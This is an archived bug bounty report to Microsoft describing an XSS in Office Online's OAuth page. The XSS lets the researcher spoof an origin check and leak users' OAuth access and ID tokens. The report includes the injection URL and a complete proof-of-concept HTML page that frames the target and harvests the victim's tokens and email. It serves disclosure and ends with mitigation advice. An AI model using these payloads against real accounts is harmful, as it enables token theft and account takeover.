---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-01-12_xss-to-oauth-access-token-leak-in-office-online-which-can-be-used-to-account-tak.md
original_filename: 2024-01-12_xss-to-oauth-access-token-leak-in-office-online-which-can-be-used-to-account-tak.md
title: XSS to OAuth access token leak in office online which can be used to account
  takeover
category: documents
detected_topics:
- xss
- oauth
- command-injection
- otp
- api-security
- cloud-security
tags:
- imported
- documents
- xss
- oauth
- command-injection
- otp
- api-security
- cloud-security
language: en
raw_sha256: 11be78f697480fc8f79acd204aa72cab7551570ce56a75d7f4a523bee6c6a9ac
text_sha256: 7edcd57be94e1dad54c8846535ef937f4d3c8a741b486cb61e74521ea2c10789
ingested_at: '2026-06-28T07:32:29Z'
sensitivity: unknown
redactions_applied: false
---

# XSS to OAuth access token leak in office online which can be used to account takeover

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-01-12_xss-to-oauth-access-token-leak-in-office-online-which-can-be-used-to-account-tak.md
- Source Type: markdown
- Detected Topics: xss, oauth, command-injection, otp, api-security, cloud-security
- Ingested At: 2026-06-28T07:32:29Z
- Redactions Applied: False
- Raw SHA256: `11be78f697480fc8f79acd204aa72cab7551570ce56a75d7f4a523bee6c6a9ac`
- Text SHA256: `7edcd57be94e1dad54c8846535ef937f4d3c8a741b486cb61e74521ea2c10789`


## Content

---
title: "XSS to OAuth access token leak in office online which can be used to account takeover"
page_title: "msrc_report.md · GitHub"
url: "https://gist.github.com/RenwaX23/0311842bb790ce98fe0cd8f41141fdf0"
final_url: "https://gist.github.com/RenwaX23/0311842bb790ce98fe0cd8f41141fdf0"
authors: ["Renwa (@RenwaX23)"]
programs: ["Microsoft"]
bugs: ["XSS", "CSP bypass", "postMessage"]
bounty: "500"
publication_date: "2024-01-12"
added_date: "2024-02-06"
source: "pentester.land/writeups.json"
original_index: 548
---

Hello MSRC Team, happy to send you another report :)

### Intro

While looking at the online Word editor I saw oauth.online.office.com then I found an XSS on it which leads to leaking access token and Id token of logged in user, we can make as many tokens we want and use it on victim account.

### Discovery

I went to Office home page [www.office.com](http://www.office.com) and chosen Word then New Blank Document it redirected me to onedrive.live.com/edit.aspx?resid=... Looking at the DOM of the page there was a big iframe pointing to word-edit.officeapps.live.com/we/wordeditorframe.aspx In my browser I have [postMessage-logger](https://github.com/opnsec/postMessage-logger) which is just a simple script listens for every postMessage() and shows me inside the console, I got an interesting message inside my console:
  
  
  Message received by: https://word-edit.officeapps.live.com
  origin: https://oauth.online.office.com
  data: {"MessageId":"SharedAuth_ScriptLoaded",..
  

Later the OAuth page responded with:
  
  
  Message received by: https://oauth.online.office.com/oa/WacOAuth.aspx
  origin: https://word-edit.officeapps.live.com
  data: {"MessageId":"SharedAuth_Init",....
  

Lets look at the domain: <https://oauth.online.office.com/oa/WacOAuth.aspx?replyUrl=https://word-edit.officeapps.live.com> The DOM:
  
  
  <script
  type="text/javascript"
  src="https://wise.public.cdn.office.net/wise/owl/sharedauthclient.f6062603a9a69f15721f.js"
  data-origin="https://word-edit.officeapps.live.com"
  ...
  ></script>
  

Looking at JS codes and trying many things I found the purpose and parameters of this page/script, Inside the url we have replyUrl parameter which will become dataset attribute of the script tag data-origin The host should be word-edit.officeapps.live.com without any path or parameters otherwise the script won't run. If the host is matched in allowed list it will send a postMessage() to the parent window saying the script is ready to start, the allowed host will also sends a message to make a token for the logged-in user which the script will make fetch request and responds back with the the token to parent page with a message, simplified flow:

  * Allowed_host makes an iframe pointing to the OAuth site with its host as replyUrl
  * The iframe sends a message to parent the script is ready
  * parent send to iframe we need token for these appIds
  * iframe makes a fetch request to login.microsoftonline.com/consumers/oauth2/v2.0/authorize and sends a message to parent request is success
  * parent asks a token for a specific appId
  * iframe says here is the access_token , ID Token and User Info

### Injection

The replyUrl parameter should be a real origin and a good syntax, it will be checked by server side to see if it's whitelisted, first request I made was this to check if the origin check is made by string checking or origin checking. replyUrl=https://@word-edit.officeapps.live.com --> data-origin="https://@word-edit.officeapps.live.com"

The check is based on origin by injecting @ before the hostname I found out it isn't string check because @word-edit.officeapps.live.com is same host as word-edit.officeapps.live.com

Next lets try to inject a path

replyUrl=<https://word-edit.officeapps.live.com/test> \--> empty

Maybe parameters

replyUrl=<https://word-edit.officeapps.live.com?test> \--> empty

Username and password of the host

replyUrl=<https://test@test2word-edit.officeapps.live.com> \--> empty

Hash Fragment

replyUrl=<https://word-edit.officeapps.live.com#test> \--> data-origin="<https://word-edit.officeapps.live.com#test>"

Nice now we have our input inside the attribute, lets try XSS

replyUrl=[https://word-edit.officeapps.live.com%23test"onload="alert(23)](https://word-edit.officeapps.live.com%23test%22onload=%22alert\(23\))" --> Refused to execute inline event handler because it violates the following Content Security Policy

Ohh there is a CSP let's check it script-src 'self' wise.public.cdn.office.net; No way to bypass this, the domains are almost static we don't have any JSONP, user uploaded files nor Angular gadgets, So I had to look for a way to make use of this Injection we have.

### Origin Check Bypass

In previous I mentioned the script will the data-origin as second parameter of postMessage but how the script is using this data?
  
  
  l = null === (i = document.getElementById("sharedauthscript")) || void 0 === i ? void 0 : i.dataset.origin;
  

It will check the element with ID sharedauthscript and grab dataset.origin, lets look at our injection DOM again:
  
  
  <script
  type="text/javascript"
  src="https://wise.public.cdn.office.net/wise/owl/sharedauthclient.f6062603a9a69f15721f.js"
  data-origin="https://word-edit.officeapps.live.com#test"onload="alert(23)""
  ...
  

Our injection is inside the script tag and we can inject any characters we want to here is the idea:

  * Using the injection we will break the current script
  * Create an element with these attributes id="sharedauthscript" and data-origin=https://our_host and data-scriptload="PRODUCTION.50: 20230319.13"
  * Create a new script tag pointing to <https://wise.public.cdn.office.net/wise/owl/sharedauthclient.f6062603a9a69f15721f.js>
  * Putting all together (example.wtf is my host): [https://oauth.online.office.com/oa/WacOAuth.aspx?replyUrl=https://word-edit.officeapps.live.com%23">](https://oauth.online.office.com/oa/WacOAuth.aspx?replyUrl=https://word-edit.officeapps.live.com%23%22%3E)</script><script data-origin="<https://example.wtf>" data-scriptload="PRODUCTION.50: 20230319.13" id="sharedauthscript" src=[https://wise.public.cdn.office.net/wise/owl/sharedauthclient.f6062603a9a69f15721f.js></script>](https://wise.public.cdn.office.net/wise/owl/sharedauthclient.f6062603a9a69f15721f.js></script>)
  * Checking console sharedauthclient.js:32 Failed to execute 'postMessage' on 'DOMWindow': The target origin provided ('word-edit.officeapps.live.com') does not match the recipient window's origin ('oauth.online.office.com'). Nice we have now spoofed the origin to accept and send us data to our host.

### Communication

The script is huge and not so easy to read since its obfuscated so I had to follow steps of <https://word-edit.officeapps.live.com> going back to the document we opened and checking the postMessage messages I found these:

  * First message {"MessageId":"SharedAuth_Init","SendTime":,"CorrelationId":"","Values":{"appIds":["..."],"upn":"[renwa.hiwa@hotmail.com](mailto:renwa.hiwa@hotmail.com)","authority":"<https://login.microsoftonline.com/>",....
  * Script will respond with {"MessageId":"SharedAuth_ScriptInitialized",...
  * Second message asking for the token for the specific app ID: {"MessageId":"SharedAuth_TryGetToken","Values":{"appName":"","appId":"...","target":"[https://augloop.office.com/v2","withPopup":false,"claims":null,"promptMessage":"","messageCorrelationId":""}}](https://augloop.office.com/v2%22,%22withPopup%22:false,%22claims%22:null,%22promptMessage%22:%22%22,%22messageCorrelationId%22:%22%22%7D%7D)
  * Script sends us the token for that app: {"MessageId":"SharedAuth_GetTokenResponse",..."accessToken":"eyJh...",...} The script sends us back many tokens which they can be used for different purposes along with username and user email address. While looking at the appIds I found this page which we can use these IDs to generate any token for any application <https://learn.microsoft.com/cs-cz/troubleshoot/azure/active-directory/verify-first-party-apps-sign-in>

### Exploitation & POC

Now we have everything need to make a real attack, the page isn't protected by XFO nor CSP so we will frame the page inside our host and spoof the data-origin value to our host, when the script loads we will send the required postMessage() functions to steal the tokens we want. POC: (change example.wtf to your host) Couldn't post here because of size limit, check the attachment
  
  
  oauth_leak.html
  

Online POC: <https://example.wtf/00mar18.html> Video POC: Screen_Recording_Oauth_xss.mov

### Mitigation

Fixing the vulnerability is easy just needs to prevent the XSS on oauth.online.office.com replyUrl parameter so it will escape double quotes " and <> so this attack can't be done and the origin can't be spoofed. Thanks **Renwa**

* * *

Contents of `oauth_leak.html` :
  
  
  <body>
  <iframe src='https://oauth.online.office.com/oa/WacOAuth.aspx?replyUrl=https://word-edit.officeapps.live.com%23%22%3E%3C/script%3E%3Cscript+data-origin=%22https://example.wtf%22+data-scriptload=%22PRODUCTION.50:%2020230319.13%22+id=%22sharedauthscript%22+src=https://wise.public.cdn.office.net/wise/owl/sharedauthclient.f6062603a9a69f15721f.js%3E%3C/script%3E'></iframe>
  
  <script>
  var info = '';
  setTimeout(()=>{
  frames[0].postMessage('{"MessageId":"SharedAuth_Init","SendTime":1680300503419,"CorrelationId":"","Values":{"appIds":["b23dd4db-9142-4734-867f-3577f640ad0c"],"upn":"test@hotmail.com","authority":"https://login.microsoftonline.com/","authorityType":"msa","tenantId":"9188040d-6c67-4c5b-b112-36a304b66dad","correlationId":"","enableConsoleLogging":false,"enablePopupFlash":false,"skipUpnCheck":true,"interactive":false}}','*')
  },1500)
  
  setTimeout(()=>{
  frames[0].postMessage('{"MessageId":"SharedAuth_TryGetToken","SendTime":1680312156987,"CorrelationId":"","Values":{"appName":"Loki","appId":"b23dd4db-9142-4734-867f-3577f640ad0c","target":"liveprofilecard.access","withPopup":false,"claims":null,"promptMessage":"","messageCorrelationId":""}}','*')
  },3500)
  
  window.addEventListener('message',(e)=>{
  nn=JSON.parse(e.data);
  info='<br><h1>pwned, account name: '+nn.Values.response.MsalResult.idTokenClaims.name + '<br>Email: ' +nn.Values.response.MsalResult.idTokenClaims.preferred_username +'<br>access token: '+nn.Values.response.MsalResult.accessToken + '<br>id Token: ' + nn.Values.response.MsalResult.idToken
  })
  setTimeout(()=>{
  document.body.innerHTML=info;
  },5000)
  </script>

* * *

**Video POC:**

[![poc](https://camo.githubusercontent.com/c0f544bdce1e46eba68f61b4d40892c7dad4911cb079f2d2ab5ee4718b476b4d/68747470733a2f2f696d672e796f75747562652e636f6d2f76692f786d55594632593763726f2f6d617872657364656661756c742e6a7067)](https://youtu.be/xmUYF2Y7cro)
